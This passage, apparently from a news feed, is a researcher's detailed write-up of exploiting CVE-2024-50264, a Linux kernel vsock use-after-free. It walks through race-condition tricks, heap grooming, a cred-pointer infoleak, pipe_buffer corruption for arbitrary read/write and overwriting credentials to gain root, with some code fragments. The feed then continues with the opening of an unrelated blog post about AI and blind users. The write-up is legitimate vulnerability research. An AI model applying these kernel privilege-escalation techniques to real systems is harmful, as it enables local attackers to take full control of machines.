    &lt;p&gt;After experimenting with &lt;code&gt;kernel-hack-drill&lt;/code&gt; on Ubuntu Server 24.04, I found that &lt;code&gt;CONFIG_RANDOM_KMALLOC_CACHES&lt;/code&gt; and &lt;code&gt;CONFIG_SLAB_BUCKETS&lt;/code&gt; block naive UAF exploitation, yet they also make cross-cache attacks absolutely stable. So, in my humble opinion:&lt;/p&gt;
    &lt;p&gt;It seems that, without a mitigation such as SLAB_VIRTUAL, the Linux kernel remains wide-open to cross-cache attacks.&lt;/p&gt;
    &lt;head rend="h2"&gt;Adapting the cross-cache attack to CVE-2024-50264&lt;/head&gt;
    &lt;p&gt;As noted in the limitations, the vulnerable &lt;code&gt;virtio_vsock_sock&lt;/code&gt; client object is allocated together with the server object (Limitation #1). That hurts the exploit for two reasons:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;On one hand, leaving the server vsock open stops the slab that holds the UAF object from being freed, which kills the cross-cache attack.&lt;/item&gt;
      &lt;item&gt;On the other hand, closing the server vsock disturbs the UAF itself.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;How to deal with it? @v4bel and @qwerty used the SLUBStick timing side channel to spot when the allocator switched to a new active slab. I went another way:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;What if I hit the&lt;/p&gt;&lt;code&gt;connect()&lt;/code&gt;syscall with a signal almost immediately?&lt;/quote&gt;
    &lt;p&gt;In short, I used one more race condition to exploit the main race condition ‚Äì and it worked:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;I sent the "immortal" signal 33 to the vulnerable &lt;code&gt;connect()&lt;/code&gt;syscall after a 10000 ns timeout, far earlier than the delay needed to trigger the UAF.&lt;/item&gt;
      &lt;item&gt;Then I verified the early race condition: &lt;list rend="ol"&gt;&lt;item&gt;The &lt;code&gt;connect()&lt;/code&gt;syscall must return "Interrupted system call"&lt;/item&gt;&lt;item&gt;Another testing client vsock should still connect to the server vsock without trouble&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;The &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I discovered that when both checks passed, only a single vulnerable &lt;code&gt;virtio_vsock_sock&lt;/code&gt; for the client vsock was created. The interrupting signal arrived before the kernel could create the second &lt;code&gt;virtio_vsock_sock&lt;/code&gt; for the server vsock. This bypassed Limitation #1 (paired-object creation). After that, I sent signal 33 again ‚Äì this time after the normal timeout ‚Äì to interrupt the vulnerable &lt;code&gt;connect()&lt;/code&gt; a second time and provoke the UAF. The cross-cache attack against &lt;code&gt;virtio_vsock_sock&lt;/code&gt; was unlocked!&lt;/p&gt;
    &lt;p&gt;Looping this early race and checking its result was quick. Once the early race succeeded, the main race that triggers the UAF became more stable; I could now hit the UAF about once per second instead of once every several minutes, solving the instability noted in Limitation #2. My race condition "speedrun" also eased Limitation #5: I managed roughly five UAF writes before the kworker hit a null-ptr-deref at &lt;code&gt;VSOCK_CLOSE_TIMEOUT&lt;/code&gt; (8 seconds).&lt;/p&gt;
    &lt;p&gt;To address Limitation #4 (the immediate null-ptr-deref in the kworker after UAF), I tried one more race condition, similarly to @v4bel and @qwerty. Right after the UAF-triggering &lt;code&gt;connect()&lt;/code&gt;, I called &lt;code&gt;listen()&lt;/code&gt; on the vulnerable vsock. If &lt;code&gt;listen()&lt;/code&gt; ran before the kworker, it changed the vsock state to &lt;code&gt;TCP_LISTEN&lt;/code&gt;, preventing the crash. Unfortunately, this step remains the most unstable part of the whole exploit; the rest is far more stable.&lt;/p&gt;
    &lt;p&gt;At that point my list of CVE-2024-50264 limitations looked like this:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;del rend="overstrike"&gt;The vulnerable&lt;/del&gt;&lt;code&gt;virtio_vsock_sock&lt;/code&gt;client object is allocated together with the server object from the same slab cache. That disturbs cross-cache attacks.&lt;/item&gt;
      &lt;item&gt;
        &lt;del rend="overstrike"&gt;Reproducing this race condition is very unstable.&lt;/del&gt;
      &lt;/item&gt;
      &lt;item&gt;The UAF write occurs in a kworker a few microseconds after &lt;code&gt;kfree()&lt;/code&gt;, too quickly for typical cross-cache attacks.&lt;/item&gt;
      &lt;item&gt;
        &lt;del rend="overstrike"&gt;A null-ptr-deref in the kworker follows the UAF write. That's why I shelved the bug at first.&lt;/del&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;del rend="overstrike"&gt;Even if that kernel oops is avoided, another null-ptr-deref occurs in the kworker after&lt;/del&gt;&lt;code&gt;VSOCK_CLOSE_TIMEOUT&lt;/code&gt;(eight seconds).&lt;/item&gt;
      &lt;item&gt;The kworker hangs in &lt;code&gt;spin_lock_bh()&lt;/code&gt;if&lt;code&gt;virtio_vsock_sock.tx_lock&lt;/code&gt;is not zero.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;With the early-signal trick in place, only two limitations were still blocking my exploit.&lt;/p&gt;
    &lt;head rend="h2"&gt;Oh so slow! The cross-cache attack shows up late to the party&lt;/head&gt;
    &lt;p&gt;As noted in Limitation #3, the UAF write in the kworker fires only a few Œºs after &lt;code&gt;kfree()&lt;/code&gt; for the &lt;code&gt;virtio_vsock_sock&lt;/code&gt;. A cross-cache attack needs much more time, so the UAF write lands on the original &lt;code&gt;virtio_vsock_sock&lt;/code&gt; and never reaches the &lt;code&gt;msg_msg&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;I didn't know how to make cross-cache procedure faster, but I knew how to slow down the attacked kernel code instead. That approach is described in Jann Horn's article Racing against the clock. It allowed to make my kworker slower than a sluggish cross-cache attack.&lt;/p&gt;
    &lt;p&gt;The main idea is to hammer the kworker with a &lt;code&gt;timerfd&lt;/code&gt; watched by a huge pile of &lt;code&gt;epoll&lt;/code&gt; instances. Here is the short recipe (see Jann's article for full detail):&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Call &lt;code&gt;timerfd_create(CLOCK_MONOTONIC, 0)&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Create 8 forks.&lt;/item&gt;
      &lt;item&gt;In each fork, call &lt;code&gt;dup()&lt;/code&gt;for the&lt;code&gt;timerfd&lt;/code&gt;100 times.&lt;/item&gt;
      &lt;item&gt;In each fork, call &lt;code&gt;epoll_create()&lt;/code&gt;500 times.&lt;/item&gt;
      &lt;item&gt;For every &lt;code&gt;epoll&lt;/code&gt;instance, use&lt;code&gt;epoll_ctl()&lt;/code&gt;to add all duplicated file descriptors to the interest list ‚Äì each&lt;code&gt;epoll&lt;/code&gt;instance now monitors all available&lt;code&gt;timerfd&lt;/code&gt;copies.&lt;/item&gt;
      &lt;item&gt;Finally, arm the &lt;code&gt;timerfd&lt;/code&gt;so the interrupt hits the kworker at just the right moment:&lt;code&gt;timerfd_settime(timerfd, TFD_TIMER_CANCEL_ON_SET, &amp;amp;retard_tmo, NULL)&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This procedure made my race-condition window around 80 times longer.&lt;/p&gt;
    &lt;p&gt;I wanted some more time to complete the cross-cache attack with a guarantee, but ran into a limit not mentioned in the original write-up. If you exceed the limit in &lt;code&gt;/proc/sys/fs/epoll/max_user_watches&lt;/code&gt;, &lt;code&gt;epoll_ctl()&lt;/code&gt; fails. From &lt;code&gt;man 7 epoll&lt;/code&gt;:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;This specifies a limit on the total number of file descriptors that a user can register across all epoll instances on the system. The limit is per real user ID. Each registered file descriptor costs roughly 90 bytes on a 32-bit kernel, and roughly 160 bytes on a 64-bit kernel. Currently, the default value for max_user_watches is 1/25 (4%) of the available low memory, divided by the registration cost in bytes.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;On Ubuntu Server 24.04 with 2 GiB of RAM, &lt;code&gt;/proc/sys/fs/epoll/max_user_watches&lt;/code&gt; is 431838, which is not huge. I could afford 8 forks √ó 500 &lt;code&gt;epoll&lt;/code&gt; instances √ó 100 duplicated file descriptors, for a total of 400000 &lt;code&gt;epoll&lt;/code&gt; watches.&lt;/p&gt;
    &lt;p&gt;That was just enough to beat Limitation #3, and I finally got &lt;code&gt;msg_msg&lt;/code&gt; data size corruption: the vsock UAF changed &lt;code&gt;msg_msg.m_ts&lt;/code&gt; from 48 bytes to 8192 (&lt;code&gt;MSGMAX&lt;/code&gt;). Now I could do out-of-bounds reading of the kernel memory using the &lt;code&gt;msgrcv()&lt;/code&gt; syscall.&lt;/p&gt;
    &lt;head rend="h2"&gt;Sorting the loot&lt;/head&gt;
    &lt;p&gt;The corrupted &lt;code&gt;msg_msg&lt;/code&gt; allowed me to read 8 KiB of data from the kernelspace.  I sorted this loot and found a promising infoleak: a kernel address &lt;code&gt;0xffffffff8233cfa0&lt;/code&gt; [1]. This infoleak was quite stable and worked with high probability, so I decided to investigate it without doing any additional heap feng shui. GDB showed that it was a pointer to the &lt;code&gt;socket_file_ops()&lt;/code&gt; kernel function. I was excited to discover that this function pointer is part of &lt;code&gt;struct file&lt;/code&gt;, because the &lt;code&gt;file&lt;/code&gt; kernel object also contains the &lt;code&gt;f_cred&lt;/code&gt; pointer [2], which leaked as well.&lt;/p&gt;
    &lt;p&gt;Here's how I examined the memory leaked by &lt;code&gt;msg_msg&lt;/code&gt; at &lt;code&gt;0xffff88800e75d600&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;gef&amp;gt; p *((struct file *)(0xffff88800e75d600 + 96*26 + 64))
$61 = {
  f_count = {
    counter = 0x0
  },
  f_lock = {
    {
      rlock = {
        raw_lock = {
          {
            val = {
              counter = 0x0
            },
            {
              locked = 0x0,
              pending = 0x0
            },
            {
              locked_pending = 0x0,
              tail = 0x0
            }
          }
        }
      }
    }
  },
  f_mode = 0x82e0003,
  f_op = 0xffffffff8233cfa0 &amp;lt;socket_file_ops&amp;gt;,    [1]
  f_mapping = 0xffff88800ee66f60,
  private_data = 0xffff88800ee66d80,
  f_inode = 0xffff88800ee66e00,
  f_flags = 0x2,
  f_iocb_flags = 0x0,
  f_cred = 0xffff888003b7ad00,                    [2]
  f_path = {
    mnt = 0xffff8880039cec20,
    dentry = 0xffff888005b30b40
  },
  ...
&lt;/code&gt;
    &lt;p&gt;As a result, my PoC exploit obtained a pointer to &lt;code&gt;struct cred&lt;/code&gt;, the structure that stores the current process credentials. The last piece needed for privilege escalation was arbitrary address writing. With that, I could overwrite the exploit process credentials and become root. That would be a data-only attack with no control-flow hijack.&lt;/p&gt;
    &lt;head rend="h2"&gt;In search of arbitrary address writing primitive&lt;/head&gt;
    &lt;p&gt;The most interesting and difficult part of the research began here. I was searching for a target kernel object for my UAF write, which could provide an arbitrary address writing exploit primitive. The search was exhausting. I've done the following:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Looked through dozens of kernel objects,&lt;/item&gt;
      &lt;item&gt;Read many kernel exploit write-ups,&lt;/item&gt;
      &lt;item&gt;Tried Kernel Exploitation Dashboard by Eduardo Vela and the KernelCTF team.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;One idea was to combine my limited UAF write with the Dirty Page Table attack (well described by Nicolas Wu). Tweaking page tables can let an attacker read and write data at arbitrary physical address.&lt;/p&gt;
    &lt;p&gt;I could combine my UAF with a cross-cache attack (or more accurately, cross-allocator attack) to modify page tables. To overwrite kernel text or heap, though, I still needed to know the physical address of the target memory. Two options came to mind:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Bruteforcing physical addresses. Not practical here: I could trigger the UAF only about five times before the kworker crashed, nowhere near enough tries.&lt;/item&gt;
      &lt;item&gt;Using the KASLR infoleak from my &lt;code&gt;msg_msg&lt;/code&gt;out-of-bounds read. I decided to try that.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I ran a quick experiment to see how KASLR behaves on &lt;code&gt;X86_64&lt;/code&gt; with &lt;code&gt;CONFIG_RANDOMIZE_BASE&lt;/code&gt; and &lt;code&gt;CONFIG_RANDOMIZE_MEMORY&lt;/code&gt; enabled. Booting a virtual machine several times, I compared the virtual and physical addresses of kernel &lt;code&gt;_text&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;VM run #1:&lt;/p&gt;
    &lt;code&gt;gef&amp;gt; ksymaddr-remote
[+] Wait for memory scan
0xffffffff98400000 T _text

gef&amp;gt; v2p 0xffffffff98400000
Virt: 0xffffffff98400000 -&amp;gt; Phys: 0x57400000
&lt;/code&gt;
    &lt;p&gt;VM run #2:&lt;/p&gt;
    &lt;code&gt;gef&amp;gt; ksymaddr-remote
[+] Wait for memory scan
0xffffffff81800000 T _text

gef&amp;gt; v2p 0xffffffff81800000
Virt: 0xffffffff81800000 -&amp;gt; Phys: 0x18600000
&lt;/code&gt;
    &lt;p&gt;Then I calculated the difference between the virtual and physical addresses:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;VM run #1: &lt;code&gt;0xffffffff98400000 ‚àí 0x57400000 = 0xffffffff41000000&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;VM run #2: &lt;code&gt;0xffffffff81800000 ‚àí 0x18600000 = 0xffffffff69200000&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Because &lt;code&gt;0xffffffff41000000&lt;/code&gt; is not equal to &lt;code&gt;0xffffffff69200000&lt;/code&gt;, leaking the virtual KASLR offset doesn't help against physical KASLR.&lt;/p&gt;
    &lt;p&gt;Thereby to perform Dirty Page Table attack, I needed a way to leak a kernel physical address. Ideally I would do this by mixing some page-allocator feng shui with my out-of-bounds read. That felt messy, and I wanted a cleaner solution.&lt;/p&gt;
    &lt;p&gt;I kept looking for a target kernel object for my UAF write, which could provide an arbitrary address writing and eventually focused on &lt;code&gt;pipe_buffer&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;When a pipe is created with the &lt;code&gt;pipe()&lt;/code&gt; system call, the kernel allocates an array of &lt;code&gt;pipe_buffer&lt;/code&gt; structures. Each &lt;code&gt;pipe_buffer&lt;/code&gt; item in this array corresponds to a memory page that holds data written to the pipe. The diagram below shows the internals of this object:&lt;/p&gt;
    &lt;p&gt;This object looked like a good UAF target. I could make a &lt;code&gt;pipe_buffer&lt;/code&gt; array the same size as &lt;code&gt;virtio_vsock_sock&lt;/code&gt; by changing the capacity of the pipe: &lt;code&gt;fcntl(pipe_fd[1], F_SETPIPE_SZ, PAGE_SIZE * 2)&lt;/code&gt;. The kernel changes the array size to &lt;code&gt;2 * sizeof(struct pipe_buffer) = 80 bytes&lt;/code&gt;, exactly matching the &lt;code&gt;virtio_vsock_sock&lt;/code&gt; size.&lt;/p&gt;
    &lt;p&gt;In addition, 4 attacker-controlled bytes from the vsock UAF write at offset 24 can flip &lt;code&gt;pipe_buffer.flags&lt;/code&gt;, just as in Max Kellermann's original Dirty Pipe attack.&lt;/p&gt;
    &lt;p&gt;The original Dirty Pipe attack doesn't even need an infoleak and grants privilege escalation with a one-shot write. Impressed, I decided to experiment with &lt;code&gt;pipe_buffer&lt;/code&gt; in my &lt;code&gt;kernel-hack-drill&lt;/code&gt;.&lt;/p&gt;
    &lt;head rend="h2"&gt;Experimenting with the Dirty Pipe attack&lt;/head&gt;
    &lt;p&gt;First, I built a Dirty Pipe prototype in &lt;code&gt;kernel-hack-drill&lt;/code&gt;; the PoC exploit &lt;code&gt;drill_uaf_w_pipe_buffer.c&lt;/code&gt; is in the repository. It:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;performs a cross-cache attack and reclaims the slab that held &lt;code&gt;drill_item_t&lt;/code&gt;objects as a slab for&lt;code&gt;pipe_buffer&lt;/code&gt;objects&lt;/item&gt;
      &lt;item&gt;exploits the UAF write to &lt;code&gt;drill_item_t&lt;/code&gt;; the attacker-controlled bytes written to&lt;code&gt;drill_item_t&lt;/code&gt;at offset 24, modify&lt;code&gt;pipe_buffer.flags&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;implements the Dirty Pipe attack, achieving LPE in one shot without an infoleak, cool!&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;To use this technique in my CVE-2024-50264 PoC exploit, I still had to bypass the last remaining Limitation #6: the kworker hangs before the UAF write if &lt;code&gt;virtio_vsock_sock.tx_lock&lt;/code&gt; is non-zero. I managed to solve that by doing &lt;code&gt;splice()&lt;/code&gt; from a regular file to the pipe, starting at offset zero:&lt;/p&gt;
    &lt;code&gt;	loff_t file_offset = 0;
	ssize_t bytes = 0;

	/* N.B. splice modifies the file_offset value */
	bytes = splice(temp_file_fd, &amp;amp;file_offset, pipe_fd[1], NULL, 1, 0);
	if (bytes &amp;lt; 0)
		err_exit("[-] splice");
	if (bytes != 1)
		err_exit("[-] splice short");
&lt;/code&gt;
    &lt;p&gt;In that case, the &lt;code&gt;pipe_buffer.offset&lt;/code&gt; field remains zero, so the kworker does not hang while acquiring the spinlock:&lt;/p&gt;
    &lt;p&gt;This seemed like a breakthrough ‚Äì until I noticed that the UAF write also corrupted the &lt;code&gt;pipe_buffer.ops&lt;/code&gt; function pointer by four zero bytes of &lt;code&gt;peer_fwd_cnt&lt;/code&gt;. That unfortunate side effect provoked kernel crashes on every later operation involving &lt;code&gt;pipe_buffer&lt;/code&gt; ‚òπÔ∏è:&lt;/p&gt;
    &lt;p&gt;This brought me to the following line of reasoning:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Completing the Dirty Pipe attack requires a working &lt;code&gt;pipe_buffer&lt;/code&gt;with an unchanged&lt;code&gt;ops&lt;/code&gt;pointer value.&lt;/item&gt;
      &lt;item&gt;Preserving &lt;code&gt;0xffffffff&lt;/code&gt;in the most significant bytes of the&lt;code&gt;pipe_buffer.ops&lt;/code&gt;function pointer requires that same value in&lt;code&gt;peer_fwd_cnt&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Setting &lt;code&gt;peer_fwd_cnt&lt;/code&gt;in&lt;code&gt;virtio_vsock_sock&lt;/code&gt;means sending data through the vsock.&lt;/item&gt;
      &lt;item&gt;Sending data through a vsock first needs a successful &lt;code&gt;connect()&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;However, a successful &lt;code&gt;connect()&lt;/code&gt;on the vulnerable vsock makes the UAF impossible ‚õî.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Alas!&lt;/p&gt;
    &lt;head rend="h2"&gt;Pipe buffer entertainment&lt;/head&gt;
    &lt;p&gt;So the original Dirty Pipe technique wouldn't fit my CVE-2024-50264 PoC exploit. But suddenly an idea struck me:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;What if I create a pipe with capacity&lt;/p&gt;&lt;code&gt;PAGE_SIZE * 4&lt;/code&gt;forcing the kernel to allocate four&lt;code&gt;pipe_buffer&lt;/code&gt;objects in&lt;code&gt;kmalloc-192&lt;/code&gt;?&lt;/quote&gt;
    &lt;p&gt;In that case, the memory object overlapping looked like this: four &lt;code&gt;pipe_buffer&lt;/code&gt; objects in one &lt;code&gt;kmalloc-192&lt;/code&gt; slab are allocated at the place of two &lt;code&gt;virtio_vsock_sock&lt;/code&gt; objects in two &lt;code&gt;kmalloc-96&lt;/code&gt; slabs. The following diagram illustrates the overlap:&lt;/p&gt;
    &lt;p&gt;Here, memory corruption can land on either of the two &lt;code&gt;virtio_vsock_sock&lt;/code&gt; objects. I'll cover these cases one at a time.&lt;/p&gt;
    &lt;p&gt;To avoid the kernel hang and crash when the UAF hits &lt;code&gt;virtio_vsock_sock&lt;/code&gt; #1, I used two tricks:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Performed a &lt;code&gt;splice()&lt;/code&gt;from a regular file to the pipe with a starting offset of zero. As mentioned earlier, this keeps the&lt;code&gt;offset&lt;/code&gt;field of the first&lt;code&gt;pipe_buffer&lt;/code&gt;at zero, so the kworker doesn't hang while acquiring the spinlock.&lt;/item&gt;
      &lt;item&gt;Discarded that first &lt;code&gt;pipe_buffer&lt;/code&gt;before triggering the UAF, leaving its&lt;code&gt;offset&lt;/code&gt;field untouched:&lt;code&gt;/* Remove the first pipe_buffer without changing the `pipe_buffer.offset` */ bytes = splice(pipe_fd[0], NULL, temp_pipe_fd[1], NULL, 1, 0); if (bytes &amp;lt; 0) err_exit("[-] splice"); if (bytes == 0) err_exit("[-] splice short"); /* * Let's read this byte and empty the first pipe_buffer. * So if the UAF writing corrupts the first pipe_buffer, * that will not crash the kernel. Cool! */ bytes = read(temp_pipe_fd[0], pipe_data_to_read, 1); /* 1 spliced byte */ if (bytes &amp;lt; 0) err_exit("[-] pipe read 1"); if (bytes != 1) err_exit("[-] pipe read 1 short");&lt;/code&gt;&lt;p&gt;After this sequence of&lt;/p&gt;&lt;code&gt;splice()&lt;/code&gt;and&lt;code&gt;read()&lt;/code&gt;, the first&lt;code&gt;pipe_buffer&lt;/code&gt;becomes inactive. Even if the subsequent UAF overwrites its&lt;code&gt;ops&lt;/code&gt;pointer, later pipe operations won't dereference that corrupted pointer, so no kernel crash occurs.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I wanted to exploit the UAF on &lt;code&gt;virtio_vsock_sock&lt;/code&gt; #2 to overwrite the fourth &lt;code&gt;pipe_buffer&lt;/code&gt;. To prevent the kernel hang when the UAF hits this second &lt;code&gt;virtio_vsock_sock&lt;/code&gt;, I called the same &lt;code&gt;splice(temp_file_fd, &amp;amp;file_offset, pipe_fd[1], NULL, 1, 0)&lt;/code&gt; two more times. These syscalls initialized the second and third &lt;code&gt;pipe_buffer&lt;/code&gt; objects, leaving their &lt;code&gt;flags&lt;/code&gt; at zero, since this pipe operation doesn't set any &lt;code&gt;PIPE_BUF_FLAG_*&lt;/code&gt; bits. Therefore, if the UAF occurs on the second &lt;code&gt;virtio_vsock_sock&lt;/code&gt;, the &lt;code&gt;spin_lock_bh()&lt;/code&gt; in &lt;code&gt;virtio_transport_space_update()&lt;/code&gt; will not hang.&lt;/p&gt;
    &lt;p&gt;These preparations of the pipe opened a door for corrupting the &lt;code&gt;page&lt;/code&gt; pointer of the fourth &lt;code&gt;pipe_buffer&lt;/code&gt;:&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;kernel-hack-drill&lt;/code&gt; let me experiment with &lt;code&gt;pipe_buffer&lt;/code&gt; objects. Without it, crafting this exploit primitive for the tricky CVE-2024-50264 would have been extremely hard.&lt;/p&gt;
    &lt;head rend="h2"&gt;AARW and KASLR's last revenge&lt;/head&gt;
    &lt;p&gt;In a &lt;code&gt;pipe_buffer&lt;/code&gt;, the &lt;code&gt;page&lt;/code&gt; pointer holds the address of a &lt;code&gt;struct page&lt;/code&gt; inside the virtual memory map (&lt;code&gt;vmemmap&lt;/code&gt;). &lt;code&gt;vmemmap&lt;/code&gt; is an array of these structures that allows the kernel to address physical memory efficiently. It is mentioned in &lt;code&gt;Documentation/arch/x86/x86_64/mm.rst&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;____________________________________________________________|___________________________________________________________
                  |            |                  |         |
 ffff800000000000 | -128    TB | ffff87ffffffffff |    8 TB | ... guard hole, also reserved for hypervisor
 ffff880000000000 | -120    TB | ffff887fffffffff |  0.5 TB | LDT remap for PTI
 ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)
 ffffc88000000000 |  -55.5  TB | ffffc8ffffffffff |  0.5 TB | ... unused hole
 ffffc90000000000 |  -55    TB | ffffe8ffffffffff |   32 TB | vmalloc/ioremap space (vmalloc_base)
 ffffe90000000000 |  -23    TB | ffffe9ffffffffff |    1 TB | ... unused hole
 ffffea0000000000 |  -22    TB | ffffeaffffffffff |    1 TB | virtual memory map (vmemmap_base)
 ffffeb0000000000 |  -21    TB | ffffebffffffffff |    1 TB | ... unused hole
 ffffec0000000000 |  -20    TB | fffffbffffffffff |   16 TB | KASAN shadow memory
__________________|____________|__________________|_________|____________________________________________________________
&lt;/code&gt;
    &lt;p&gt;Hence, when I managed to perform a UAF write of controlled data to the &lt;code&gt;pipe_buffer.page&lt;/code&gt; pointer, I gained arbitrary address reading and writing (AARW) via the pipe. However, I wasn't able to change the AARW target address many times, as I mentioned in Limitation #5, so I had to choose the target in &lt;code&gt;vmemmap&lt;/code&gt; carefully.&lt;/p&gt;
    &lt;p&gt;My first thought was to overwrite part of the kernel code. But with KASLR enabled, I didn't know the physical address of kernel &lt;code&gt;_text&lt;/code&gt; and therefore couldn't determine its location inside &lt;code&gt;vmemmap&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;That's why I decided to use the pipe AARW against &lt;code&gt;struct cred&lt;/code&gt; in the kernel heap. As I described earlier, I leaked the virtual address of &lt;code&gt;cred&lt;/code&gt; using my &lt;code&gt;msg_msg&lt;/code&gt; out-of-bounds read. This virtual address looked like &lt;code&gt;0xffff888003b7ad00&lt;/code&gt;, and I understood it was from the direct mapping of all physical memory. So I used the following formula to calculate the offset of the corresponding &lt;code&gt;struct page&lt;/code&gt; in &lt;code&gt;vmemmap&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;#define STRUCT_PAGE_SZ 64lu
#define PAGE_ADDR_OFFSET(addr) (((addr &amp;amp; 0x3ffffffflu) &amp;gt;&amp;gt; 12) * STRUCT_PAGE_SZ)
uaf_val = PAGE_ADDR_OFFSET(cred_addr);
&lt;/code&gt;
    &lt;p&gt;The idea behind it is simple:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;addr &amp;amp; 0x3ffffffflu&lt;/code&gt;gives the offset of the&lt;code&gt;struct cred&lt;/code&gt;from the&lt;code&gt;page_offset_base&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Right shift by 12 gives the number of the memory page containing &lt;code&gt;struct cred&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Finally, multiplication by 64 (the size of &lt;code&gt;struct page&lt;/code&gt;) gives the offset of the corresponding&lt;code&gt;struct page&lt;/code&gt;in the&lt;code&gt;vmemmap&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This formula should be adapted if the system has more than 4 GiB of RAM. In that case, &lt;code&gt;ZONE_NORMAL&lt;/code&gt; containing kernel allocations usually starts at address &lt;code&gt;0x100000000&lt;/code&gt;. Hence, to calculate the offset of the needed &lt;code&gt;struct page&lt;/code&gt;, we should add &lt;code&gt;(0x100000000 &amp;gt;&amp;gt; 12) * STRUCT_PAGE_SZ&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Excellent, the described formula is independent of KASLR for physical addresses, so I could use it to calculate the four lower bytes of the target address for exploiting the pipe AARW against the &lt;code&gt;struct cred&lt;/code&gt;. Why I needed only four lower bytes of &lt;code&gt;pipe_buffer.page&lt;/code&gt;:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;My UAF write to &lt;code&gt;peer_buf_alloc&lt;/code&gt;performed partial overwriting of the first half of the&lt;code&gt;pipe_buffer.page&lt;/code&gt;pointer, as I showed at the diagram above.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;x86_64&lt;/code&gt;is little-endian, so the first half of the pointer contains four lower bytes of the address.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;But when I tried this approach, KASLR carried out its last revenge. It randomized the &lt;code&gt;vmemmap_base&lt;/code&gt; address, and the four lower bytes of the &lt;code&gt;struct page&lt;/code&gt; pointers carried two random bits. Ouch!&lt;/p&gt;
    &lt;p&gt;However, I decided to brute-force those two bits because I could achieve the UAF write around 5 times before the kworker got a null-ptr-deref after &lt;code&gt;VSOCK_CLOSE_TIMEOUT&lt;/code&gt; (8 sec).&lt;/p&gt;
    &lt;p&gt;I found that probing different values of &lt;code&gt;pipe_buffer.page&lt;/code&gt; from userspace works perfectly well:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;In case of fail, reading from the pipe simply returns &lt;code&gt;Bad address&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;In case of success, reading from the pipe gives &lt;code&gt;struct cred&lt;/code&gt;contents.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Great! I could finally determine a proper AARW target address, write to the pipe, overwrite euid and egid with 0, and get root. See the PoC exploit demo:&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;Bug collisions are painful. Finishing the research anyway is rewarding. Let me quote my good friend:&lt;/p&gt;
    &lt;p&gt;Working on this hard race condition with multiple limitations allowed me to discover new exploitation techniques and to use and improve my pet project kernel-hack-drill, which provides a testing environment for Linux kernel security researchers. You are welcome to try it and contribute.&lt;/p&gt;
    &lt;p&gt;Thanks for reading!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45112996</guid></item><item><title>AI is going great for the blind (2023)</title><link>https://robertkingett.com/posts/6230/</link><description>&lt;doc fingerprint="2c1a019813c7afb7"&gt;
  &lt;main&gt;
    &lt;p&gt;As I was looking at the amount of times platforms died on the web and I began thinking about the slow death of AI enthusiasm and what that will do to the Blind community.&lt;/p&gt;
    &lt;p&gt;It really is a bizarre feeling when you‚Äôre the only skeptic of a thing within your own community. My first post about AI has gained some attention, as well as the follow up post about this topic. AI is taking the blind community by storm. Be my Eyes has added it into their product to describe pictures, Let‚Äôs not mention the fact the particular large language model, LLM called Chat GPT they chose, was never the right kind of machine learning for the task of describing images. A different kind of machine learning would have been better. Blind podcasters are praising LLMs and saying they‚Äôre more accurate than human descriptions, and, well, blind voiceover artists are more than willing to give places like ElevenLabs their voices so they can, well, I don‚Äôt even know yet. I guess attempt to make audiobooks.&lt;/p&gt;
